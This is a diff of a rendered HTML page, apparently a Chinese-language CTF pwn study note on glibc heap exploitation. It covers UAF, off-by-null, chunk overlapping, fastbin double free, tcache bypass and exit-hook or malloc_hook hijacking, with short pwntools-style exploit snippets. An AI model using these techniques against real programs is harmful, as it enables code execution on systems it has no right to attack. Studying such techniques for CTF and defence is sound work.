+</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">arg_list</span><span class="p">[</span><span class="mi">32</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">next_args</span><span class="p">);</span> <span class="c1">// 漏洞点: 先写入arg_list再判断是否大于10
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">nargs</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="p">){</span> <span class="k">return</span> <span class="n">idx</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>调用越界</strong></p>
+<ul>
+<li>先任意写入system地址到bss段，尝试越界修改bss段中idx使得偏移调用system函数</li>
+<li><code>arg_list</code>也可尝试任意地址写入<code>'/bin/sh'</code></li>
+<li>注意有时<code>p64(0xab)</code>时使用<code>replace(b'\x00', b'')</code>或<code>p64(0x123456781234)[:6]</code>替换防止提前0截断</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">funcs_list</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">idx</span><span class="p">))(</span><span class="n">arg_list</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="地址泄露">地址泄露</h3>
 <p><strong>read漏洞点</strong></p>
 <p>无canary时，下述代码泄露栈地址，构造<code>payload=b'a'*0x30</code>，接收48个a后会泄露出后续栈地址内容</p>
 <div class="highlight"><div class="chroma">
@@ -7891,6 +8086,11 @@
 	
 	
 ></p>
+<h3 id="exit-hook">Exit Hook</h3>
+<ul>
+<li><code>/stdlib/exit.c</code>中原函数</li>
+<li>pwndbg中<code>u _dl_fini</code>找到<code>rtld_lock_default_unlock_recursive</code>，劫持其地址为one_gadget，退出时call one_gadget达到劫持效果</li>
+</ul>
 <h2 id="格式化字符串">格式化字符串</h2>
 <ul>
 <li>格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数</li>
@@ -8381,12 +8581,7 @@
 </span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="exit-hook">exit hook</h2>
-<ul>
-<li><code>/stdlib/exit.c</code>中原函数</li>
-<li>pwndbg中<code>u _dl_fini</code>找到<code>rtld_lock_default_unlock_recursive</code>，劫持其地址为one_gadget，退出时call one_gadget达到劫持效果</li>
-</ul>
-<h2 id="堆溢出漏洞">堆溢出漏洞</h2>
+</div><h2 id="堆溢出漏洞">堆溢出漏洞</h2>
 <img src="/img/pwn_note.zh-cn.assets/-172844670575344.assets" alt="img" style="zoom: 80%;" />
 <h3 id="堆管理器">堆管理器</h3>
 <p>用户与OS之间作为动态内存管理的中间人，由libc.so.6链接库实现，封装了系统调用（申请内存的 <code>brk</code> 与 <code>mmap</code> ），存在于【shared library即mmap段】</p>
@@ -8767,7 +8962,28 @@
 	
 	
 ></p>
-<p><strong>stash机制</strong></p>
+<p><strong>key字段</strong></p>
+<ul>
+<li>glibc-2.29引入，位于chunk的bk字段，值为tcache结构体地址，用于检测double free，可泄露tcache key泄露堆地址</li>
+<li>glibc-2.34后，<code>tcache_put</code>函数中，key值设为随机值<code>tcache_key</code>，不再能泄露堆地址</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span> <span class="c1">// 检测double free
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>stash机制</strong></p>
 <p>申请在tcache范围时，先tcache直到空，再去bin找；tcache为空，ptmalloc在其他bin中找，若fastbin/smallbin/unsorted bin有size符合的chunk，填入tcache直到塞满，之后从tcache中取或直接返回找到的chunk（<strong>此时chunk在bin中和tcache中顺序颠倒</strong>）</p>
 <p><strong>安全检查</strong></p>
 <ul>
@@ -8797,7 +9013,8 @@
 <li>large bin最小的一组chunk中的第一个chunk的<code>fd_nextsize</code>连接最大的chunk，最大的chunk的<code>bk_nextsize</code>相反</li>
 </ul>
 <img src="/img/pwn_note.zh-cn.assets/image-20241118201403530.png" alt="image-20241118201403530" style="zoom:80%;" />
-<h3 id="unlink">Unlink</h3>
+<h3 id="漏洞点">漏洞点</h3>
+<h4 id="unlink">Unlink</h4>
 <ul>
 <li><strong>条件</strong>：有堆溢出或off by null，且可以泄露出指针数组地址</li>
 <li><code>free</code>时和目前<strong>物理相邻的 free chunk 合并为新堆块</strong>，避免碎片化内存，将某一个空闲 chunk 从其所处的双向链表中脱链</li>
@@ -8915,55 +9132,16 @@
 <p>同样的方法，将<code>free</code>函数的<code>got</code>表覆写为<code>system</code>函数的真实地址，<code>free</code>写有&quot;/bin/sh&quot;的堆</p>
 </li>
 </ul>
-<h3 id="uaf">UAF</h3>
-<p><strong>Use after free</strong>：内存块被释放之后再次被使用，关键在于<strong>指针未被设置为NULL</strong>，即原先指针并没有消失，只是由fastbins或tcache中新增出了指针将chunk连成链表</p>
-<p><strong>漏洞点：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">func1</span><span class="p">(){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;func1</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">hack</span><span class="p">(){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);}</span>
-</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Pfunc</span><span class="p">{</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">)();};</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">Pfunc</span><span class="o">*</span> <span class="n">lpfunc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">lpfunc</span><span class="o">-&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="n">func1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">lpfunc</span><span class="o">-&gt;</span><span class="n">p</span><span class="p">();</span>    <span class="c1">//&#34;func1&#34;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
-</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">lpfunc</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">    <span class="kt">long</span><span class="o">*</span> <span class="n">hack_point</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">hack_point</span> <span class="o">=</span> <span class="n">hack</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl">    <span class="n">lpfunc</span><span class="o">-&gt;</span><span class="n">p</span><span class="p">();</span>    <span class="c1">//&#34;hack&#34;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>fastbins使用LIFO，后进先出，所以申请同样大小的chunk，会使用最后一次free的chunk，此时可达到 <strong>hack_point指针 与 lpfunc指针 指向同一个地址【刚才free的chunk地址】</strong></li>
-<li>调试中，fastbins指向的地址为0x0804b000，而两指针指向的地址为0x0804b008，由于malloc指针指向data，而fastbins指向prev_size，prev_size 和 size 在32位下刚好占8字节，所以偏移了8</li>
+<h4 id="uaf">UAF</h4>
+<ul>
+<li>
+<p>Use after free，内存块被释放之后再次被使用，关键在于<strong>指针未被设置为NULL</strong></p>
+</li>
+<li>
+<p>即原先指针并没有消失，fastbins或tcache中新增了指针将chunk连成链表</p>
+</li>
 </ul>
+<p><strong>漏洞点：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -8974,15 +9152,15 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">o</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>    
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">o</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl"><span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>    <span class="c1">//向s指向的地址写数据
+</span></span><span class="line"><span class="cl"><span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>    <span class="c1">// 向s指向的地址写数据
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">o</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))(</span><span class="n">o</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>利用：</p>
+</div><p><strong>利用</strong>：o+3是调用func1，但篡改后相当于调用shellcode</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844670575454.assets"
 	
 	
@@ -8993,7 +9171,6 @@
 	
 	
 ></p>
-<p>o+3是调用func1，但篡改后相当于调用了shellcode</p>
 <p><strong>hacknote</strong>基本实现：一次malloc两个堆块，且第一个堆块固定为8字节，第二个堆块自己申请</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844670575455.assets"
 	
@@ -9017,13 +9194,140 @@
 	
 	
 ></p>
-<h3 id="double-free">Double free</h3>
-<p>glibc-2.23</p>
+<h4 id="off-by-null">Off-by-null</h4>
+<p><strong>off-by-one</strong>：更改后一块的<code>size</code>位，用于合并堆块造成堆块重叠</p>
+<p>原理：程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节；利用该漏洞可以实现利用方法：<strong>poison null byte/off-by-null（适用于libc-2.27）</strong></p>
+<p><strong>触发漏洞：</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/-172844676894985.assets"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p><strong>原理</strong>：free(b)后并没有将b指针置为NULL，且此时b中的prev_size作为a的内容，可以填入a的数据，若能控制a的数据，超过b的prev_size区域后并且覆盖b的size区域中一个字节，则造成off-by-one</p>
 <ul>
-<li>堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次free，达成任意地址写，<strong>注：不可以直接连续两次free，会被<code>_int_free</code>检测到fastbin double free</strong></li>
-<li>free掉chunk时，判断 chunk 大小和所处位置，若 chunk_size &lt;= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中</li>
+<li>要绕过高版本的glibc需要在b上构造数据进行绕过验证，旧版本check为<code>size==prev_size(next_chunk)</code>，新版本check为**<code>chunksize(P) != prev_size (next_chunk(P))</code>**</li>
+<li>在off by one后，<code>b</code>的<code>size</code>将会由于覆盖而改变，<code>chunksize(P)</code>即<code>b</code>的<code>size</code>大小，被覆盖为了<code>0xa00</code>，而<code>next_chunk(P)</code>本来应该为<code>c</code>的<code>prev_size</code>，但是此时并不是<code>c</code>，对于<code>b</code>的<code>next_chunk</code>的计算应该是<code>b</code>的<code>chunk</code>指针加上<code>b</code>的<code>size</code>，即图中【b-0x10+0xa00】，仍在<code>b</code>的<code>chunk</code>内，所以提前构造<code>* (size_t)(b+0x9f0) = 0xa00;</code></li>
 </ul>
-<p>申请2个0x60的堆块【1,2】进行如下操作：</p>
+<p><img src="/img/pwn_note.zh-cn.assets/-172844676894986.assets"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p>free <code>b</code>后，进入<code>unsorted bin</code>中，申请新的<code>B1</code>和<code>B2</code>，将会从原来<code>b</code>的位置延续，而修改<code>c</code>的<code>pre_size</code>时也会因为伪造导致修改在了向上偏0x10的位置处，所以<code>c</code>仍然认为<code>prev_size</code>为<strong>0xa10</strong>，free B1和c后，会导致B1、B2和c一同合并为一个大chunk进入<code>unsorted bin</code>中，而B2并没有被free，再次申请d，会出现覆盖B2的情况（形成堆的堆叠），此时可以任意修改B2中的内容，通常B2（受害者）将是一个结构，其中包含我们要控制的有价值的指针</p>
+<p><strong>漏洞点：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="p">;</span><span class="o">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="n">length</span><span class="p">)</span> <span class="k">break</span> <span class="c1">//i=length时多写一个
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用实现unsorted bin泄露方法：</p>
+<p>构造0,1,2,3共四个堆块，修改0号堆块内容溢出一字节到1堆块更改大小覆盖1和2堆块，此时1和2堆块被系统误认为为一个堆块，释放1堆块，将会有一个合并chunk进入unsorted bin（进入的<strong>前提</strong>为<strong>1和2堆块相加的大小要大于0x80</strong>），再申请一个堆块（和1堆块大小相等），此时unsorted bin分割导致只存有2堆块，2堆块的fd和bk都指向一个地址，访问2堆块可以泄露相关main_arena的地址</p>
+<h3 id="堆叠">堆叠</h3>
+<p>通过堆块堆叠，使一个堆块可控制另一个堆块头部，比UAF只能控制fd和bk字段多了可控制的prev_size和size字段</p>
+<p><strong>UAF转堆叠</strong></p>
+<p>glibc-2.23中fastbin为例，在堆块内存区域伪造chunk size，UAF部分地址写将fd修改到伪造chunk头部，将fake chunk申请达成堆叠</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># 覆盖fd末尾一字节为00指向前面edit的fake chunk</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/pwn_note.zh-cn.assets/image-20241130124443597.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241130124443597"
+	
+	
+></p>
+<p><strong>off-by-null转堆叠</strong></p>
+<h3 id="fast-bin-attack">fast bin attack</h3>
+<h4 id="double-free">Double Free</h4>
+<p><strong>条件</strong></p>
+<ul>
+<li>
+<p>glibc-2.23，且存在UAF漏洞：堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次free，达成任意地址写</p>
+</li>
+<li>
+<p>free掉chunk时，判断 chunk 大小和所处位置，若 chunk_size &lt;= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中</p>
+</li>
+</ul>
+<p><strong>绕过</strong></p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 直接连续两次free _int_free 会检测出double free
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span><span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其只检查链表中第一个chunk是否是待释放chunk，所以先释放chunk2再释放chunk1绕过</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span><span class="p">(</span><span class="n">fastbin_index</span><span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>要保证申请target chunk 位置对应 size 字段的值正确</strong></p>
+</li>
+</ul>
+<p><strong>利用</strong></p>
+<ul>
+<li>申请2个0x60的堆块【1,2】进行如下操作：</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -9036,18 +9340,24 @@
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 均进入 fast bins</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/img/pwn_note.zh-cn.assets/-172844676894871.assets"
+</div><ul>
+<li>
+<p>调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址（如malloc_hook偏移地址）</p>
+</li>
+<li>
+<p>在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用<code>Arbitrary Alloc</code>劫持malloc_hook为one_gadget</p>
+</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241125141220909.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="img"
+		alt="image-20241125141220909"
 	
 	
 ></p>
-<p>调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址，在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用malloc_hook劫持为one_gadget：<strong><code>fastbin Arbitrary Alloc</code></strong></p>
-<h3 id="fast-bin-attack">fast bin attack</h3>
 <h4 id="arbitrary-alloc">Arbitrary Alloc</h4>
 <p><strong>条件</strong></p>
 <ul>
@@ -9199,11 +9509,321 @@
 <p><strong>malloc报错触发</strong></p>
 <p>通过<code>double free</code>来触发malloc报错，其最后也会执行malloc，此时栈结构也进行了改变，可能达成one_gadget条件</p>
 <h3 id="tcache-bin-attack">Tcache bin attack</h3>
-<ol>
-<li>一般利用UAF需要<code>malloc(0x80)</code>然后经过7次<code>free(0)</code>填充完<code>tcache bin</code>，<strong>注：每次free(0)需要修改edit(0)改fd和bk为0，否则fd将会是堆块地址中部分数值，使得不可循环free</strong></li>
-<li>然后再free时进入<code>unsorted bin</code>泄露libc基址</li>
-</ol>
-<h4 id="safe-linking机制">Safe-linking机制</h4>
+<h4 id="tcache-bypass">Tcache Bypass</h4>
+<p>让释放的chunk不进入tcache bin</p>
+<ul>
+<li>释放不在tcache大小范围的chunk</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span> <span class="c1"># 0x400在tcache bin范围内</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>释放 7 个同样大小 chunk 进入 tcache 填满</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add_chunk</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delete_chunk</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>利用UAF，<code>malloc(0x80)</code>，然后7次<code>free(0)</code>填充完<code>tcache bin</code>，每次free(0)需要edit(0)修改fd和bk为0，否则fd将会是某堆块地址中数值，使得不可循环free，再free进入<code>unsorted bin</code>泄露libc基址</li>
+<li>限制free次数，通过<code>tcache dup</code>malloc 3次将counts改为-1绕过</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># double free 将 tcache bin中第一个chunk指向自身</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">add_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">)</span> <span class="c1"># -1</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">delete_chunk</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>控制<code>tcache_perthread_struct</code>，控制<code>counts</code>实现绕过</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
